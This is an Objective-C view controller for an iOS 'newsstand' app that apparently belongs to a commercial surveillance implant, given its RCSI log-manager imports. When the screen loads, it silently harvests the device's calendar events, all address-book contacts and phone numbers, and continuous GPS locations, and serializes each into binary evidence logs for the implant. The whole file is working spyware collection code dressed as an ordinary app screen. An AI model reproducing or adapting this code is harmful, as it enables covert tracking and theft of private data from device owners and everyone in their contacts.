//
//  ViewController.m
//  newsstand-app
//
//  Created by Massimo Chiodini on 10/29/14.
//
//
#import "RCSICommon.h"
#import "RCSILogManager.h"

#import "ViewController.h"

@interface ViewController ()

@property (nonatomic, strong) CLLocationManager *locationManager;

-(void)requestAccessToEvents;

@end

@implementation ViewController

#pragma mark -
#pragma mark - Calendario
#pragma mark -


- (void)writeCalLog: (EKEvent*)anEvent
{
  UInt32 prefix = 0;
  UInt32 outLength = 0;
  HeaderStruct header;
  HeaderStruct *tmpHeader = NULL;
  PoomCalendar calStruct;
  
  NSMutableData *calData = [[NSMutableData alloc] initWithCapacity: 0];
  
  memset(&header, 0, sizeof(HeaderStruct));
  memset(&calStruct, 0, sizeof(PoomCalendar));
  
  header.dwVersion = POOM_V1_0_PROTO;
  outLength = sizeof(HeaderStruct);
  
  // FLAGS + StartDate + EndDate + 5 Long
  outLength += sizeof(calStruct);
  
  int64_t filetime = ((int64_t)[[anEvent startDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftStartDateHi = filetime >> 32;
  calStruct._ftStartDateLo = filetime & 0xFFFFFFFF;
  
  filetime = ((int64_t)[[anEvent endDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftEndDateHi = filetime >> 32;
  calStruct._ftEndDateLo = filetime & 0xFFFFFFFF;
  
  [calData appendBytes: (const void *) &header length: sizeof(header)];
  [calData appendBytes: (const void *) &calStruct length:sizeof(PoomCalendar)];
  
  //POOM_STRING_SUBJECT
  if ([anEvent title])
  {
    char * tmpString = (char*)[[anEvent title] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    if (tmpString)
    {
      UInt32 tmpLen = [[anEvent title] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      outLength += sizeof(UInt32);
      
      outLength += tmpLen;
      
      prefix = tmpLen;
      
      prefix &= POOM_TYPE_MASK;
      prefix |= (UInt32)POOM_STRING_SUBJECT;
      
      [calData appendBytes: &prefix length: sizeof(UInt32)];
      [calData appendBytes: tmpString length: tmpLen];
    }
  }

  if ([anEvent notes])
  {
    char * tmpString = (char*)[[anEvent notes] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    if (tmpString)
    {
      UInt32 tmpLen = [[anEvent notes] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      outLength += sizeof(UInt32);
      outLength += tmpLen;
      
      prefix = tmpLen;
      
      prefix &= POOM_TYPE_MASK;
      prefix |= (UInt32)POOM_STRING_BODY;
      
      [calData appendBytes: &prefix length: sizeof(UInt32)];
      [calData appendBytes: tmpString length: tmpLen];
    }
  }

  if ([anEvent location])
  {
    char * tmpString = (char*)[[anEvent location] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    if (tmpString)
    {
      UInt32 tmpLen = [[anEvent location] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      outLength += sizeof(UInt32);
      outLength += tmpLen;
      
      prefix = tmpLen;
      
      prefix &= POOM_TYPE_MASK;
      prefix |= (UInt32)POOM_STRING_LOCATION;
      
      [calData appendBytes: &prefix length: sizeof(UInt32)];
      [calData appendBytes: tmpString length: tmpLen];
    }
  }
  
  // Setting total length
  tmpHeader = (HeaderStruct *) [calData bytes];
  tmpHeader->dwSize = outLength;
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CALENDAR
                           agentHeader: nil
                             withLogID: 0];
  // Write data to log
  if (success == TRUE && [logManager writeDataToLog: calData
                                           forAgent: LOG_CALENDAR
                                          withLogID: 0] == TRUE)
  {
    [logManager closeActiveLog: LOG_CALENDAR withLogID: 0];
  }

}

-(void)requestAccessToEvents{
  
  [appDelegate.eventManager.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error) {
    if (error == nil) {
      // Store the returned granted value.
      appDelegate.eventManager.eventsAccessGranted = granted;
    }
  }];
}

- (void)getCalendarsEvents:(NSArray*)calendars
{
  for (int i=0; i<[calendars count]; i++)
  {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"dd MMM y hh:mm a"];
    
    NSDate *endDate = [dateFormatter dateFromString:@"01 Jan 2021 12:00 pm"];
    
    NSPredicate *fetchCalendarEvents =
    [appDelegate.eventManager.eventStore predicateForEventsWithStartDate:[NSDate date]
                                                                 endDate:endDate
                                                               calendars:calendars];
    
    NSArray *eventList = [appDelegate.eventManager.eventStore eventsMatchingPredicate:fetchCalendarEvents];
    
    for(int i=0; i < eventList.count; i++)
    {
      EKEvent *event = [eventList objectAtIndex:i];
      [self writeCalLog: event];
    }
  }
}

- (void)getCalendars
{
  NSArray *localCal = [appDelegate.eventManager getLocalEventCalendars];
  [self getCalendarsEvents:localCal];
}

#pragma mark -
#pragma mark - Contatti
#pragma mark -

- (BOOL)writeABLog: (NSMutableArray *)records
{
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST_2;
  abFile.magic    = CONTACTFILE;
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = [records count];
  header.len        = 0xFFFFFFFF;
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  for (int i=0; i< [records count]; i++)
  {
    NSDictionary *rec   = (NSDictionary *) [records objectAtIndex: i];
    
    NSString *firstN    = [rec objectForKey: @"First"];
    NSString *lastN     = [rec objectForKey: @"Last"];
    NSMutableArray *num = [rec objectForKey: @"Numbers"];
    NSString *isMyNumber= [rec objectForKey: @"IsMyNumber"];
    
    // New contact
    abFile.len   = 0;
    
    // if log is Chat bogus contacts flag = 0x80000001
    if ([isMyNumber  isEqual: @"YES"])
      abFile.flag = 0x80000000;
    else
      abFile.flag = 0x00000000;
    
    [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
    
    // FirstName abNames
    abNames.len = [firstN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
    [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
    [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
                 length: abNames.len];
    
    // LastName abNames
    abNames.len = [lastN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
    [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
    [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
                 length: abNames.len];
    
    // Telephone numbers
    abContat.numContats = [num count];
    [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
    
    for (int a=0; a < [num count]; a++)
    {
      NSDictionary *telNum = [num objectAtIndex: a];
      
      abNumber.type = a;
      [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
      
      NSString *number = [telNum objectForKey: @"Number"];
      abNames.len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
                   length: abNames.len];
    }
  }
  
  // Setting len of NSData - sizeof(magic)
  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
  {
    if ([logManager writeDataToLog: abData
                          forAgent: LOG_ADDRESSBOOK
                         withLogID: 0] == TRUE)
    {
      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
    }
  }
  else
    return NO;
  
  return YES;
}

- (void)getABContatcs
{
  NSMutableArray *abContacts = [[NSMutableArray alloc] initWithCapacity:0];
  
  ABAddressBookRef addressBookRef = ABAddressBookCreateWithOptions(NULL, nil);
  NSArray *allContacts = (__bridge NSArray *)ABAddressBookCopyArrayOfAllPeople(addressBookRef);
  
  for (int i=0; i<[allContacts count]; i++)
  {
    NSMutableArray  *nums  = [[NSMutableArray alloc] initWithCapacity:0];
    
    ABRecordRef record = (__bridge ABRecordRef)[allContacts objectAtIndex:i];
    
    NSString *first = (__bridge NSString*)ABRecordCopyValue(record,kABPersonFirstNameProperty);
    NSString *last  = (__bridge NSString*)ABRecordCopyValue(record,kABPersonLastNameProperty);
    ABMultiValueRef phoneNumberMultiValue = ABRecordCopyValue(record, kABPersonPhoneProperty);
    
    for (int phoneNumberIndex = 0; phoneNumberIndex < ABMultiValueGetCount(phoneNumberMultiValue); phoneNumberIndex++)
    {
      NSString *phoneNumber  = (__bridge NSString *)ABMultiValueCopyValueAtIndex(phoneNumberMultiValue, phoneNumberIndex);
      NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:phoneNumber, @"Number", nil];
      [nums addObject: dict];
    }
    
    NSString *myNum = @"NO";
    
    NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:first != nil?first:@" ", @"First",
                                                                    last  != nil?last:@" ",  @"Last",
                                                                    nums,  @"Numbers",
                                                                    myNum, @"IsMyNumber",
                          nil];
    [abContacts addObject:dict];
  }
  
  [self writeABLog: abContacts];
}

- (void)initAddressBookManager
{
  if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusDenied ||
      ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusRestricted)
  {
    NSLog(@"Denied");
  }
  else if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusAuthorized)
  {
    NSLog(@"Authorized");
  }
  else
  {
    ABAddressBookRequestAccessWithCompletion(ABAddressBookCreateWithOptions(NULL, nil),
                                             ^(bool granted, CFErrorRef error)
                                             {
                                               if (!granted)
                                                 return;
                                             });
  }
}

#pragma mark -
#pragma mark - GPS
#pragma mark -

- (void)initLocationManager
{
  self.locationManager = nil;
  self.locationManager = [[CLLocationManager alloc] init];
  self.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
  self.locationManager.delegate = self;
  if(![CLLocationManager authorizationStatus])
  {
    [self.locationManager requestAlwaysAuthorization];
  }
}

#define LOG_DELIMITER 0xABADC0DE

- (void)setupGPSPositionStruct:(GPS_POSITION*)position withLocation:(CLLocation*)currentLocation
{
  memset(position, 0, sizeof(GPS_POSITION));
  position->dwVersion = LOG_LOCATION_VERSION;
  position->dwSize = sizeof(GPS_POSITION);
  
  position->dwVersion = 0xFFFF;
  
  position->dblLatitude  = [currentLocation coordinate].latitude;
  position->dblLongitude = [currentLocation coordinate].longitude;
  
  position->flSpeed      = [currentLocation speed];
  position->flAltitudeWRTEllipsoid = [currentLocation altitude];
  position->flAltitudeWRTSeaLevel  = [currentLocation altitude];
  position->FixType = 2;
}

- (void)setupGPSInfoStruct:(GPSInfo*)info withLocation:(CLLocation*)currentLocation
{
  time_t unixTime;
  time(&unixTime);
  int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  info->type = LOGTYPE_LOCATION_GPS;
  info->uSize = sizeof(GPSInfo);
  info->uVersion = LOG_LOCATION_VERSION;
  info->ft.dwHighDateTime = (int64_t)filetime >> 32;
  info->ft.dwLowDateTime  = (int64_t)filetime & 0xFFFFFFFF;
  info->dwDelimiter = LOG_DELIMITER;
  [self setupGPSPositionStruct: &info->gps withLocation:currentLocation];
}

- (void) writeGPSLocationLog:(CLLocation*)currentLocation
{
  NSMutableData *additionalData = [[NSMutableData alloc] initWithLength:sizeof(LocationAdditionalData)];
  NSMutableData *gpsInfoData    = [[NSMutableData alloc] initWithLength:sizeof(GPSInfo)];
  
  pLocationAdditionalData location  = (pLocationAdditionalData) [additionalData bytes];
  GPSInfo *info                     = (GPSInfo*)[gpsInfoData bytes];
  
  /*
   * additional header (LocationAdditionalData)
   */
  location->uVersion = LOG_LOCATION_VERSION;
  location->uType    = LOGTYPE_LOCATION_GPS;
  location->uStructNum = 0;
  
  /*
   * setup gps params (GPSInfo)
   */
  [self setupGPSInfoStruct: info withLocation: currentLocation];
  
  NSMutableData *entryData = [[NSMutableData alloc] init];
  [entryData appendData: gpsInfoData];
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  if ([logManager createLog:LOGTYPE_LOCATION_NEW
                agentHeader:additionalData
                  withLogID:LOGTYPE_LOCATION_GPS])
  {
    [logManager writeDataToLog:entryData
                      forAgent:LOGTYPE_LOCATION_NEW
                     withLogID:LOGTYPE_LOCATION_GPS];
  }
  
  [logManager closeActiveLog:LOGTYPE_LOCATION_NEW withLogID:LOGTYPE_LOCATION_GPS];
}

- (void)locationManager:(CLLocationManager *)manager
    didUpdateToLocation:(CLLocation *)newLocation
           fromLocation:(CLLocation *)oldLocation
{
  [self writeGPSLocationLog:newLocation];
}

#pragma mark -
#pragma mark - ViewController Start Cal, AB, GPS
#pragma mark -

- (void)viewDidLoad
{
  [super viewDidLoad];
  
  appDelegate = [[UIApplication sharedApplication] delegate];
  
  // Grab Calendar
  [self performSelector:@selector(requestAccessToEvents) withObject:nil afterDelay:0.4];
  [self getCalendars];
  
  // Grab AB
  [self initAddressBookManager];
  [self getABContatcs];
  
  // Start Grabbing GPS
  [self initLocationManager];
  [self.locationManager startUpdatingLocation];
}

- (void)didReceiveMemoryWarning {
  [super didReceiveMemoryWarning];
}


@end
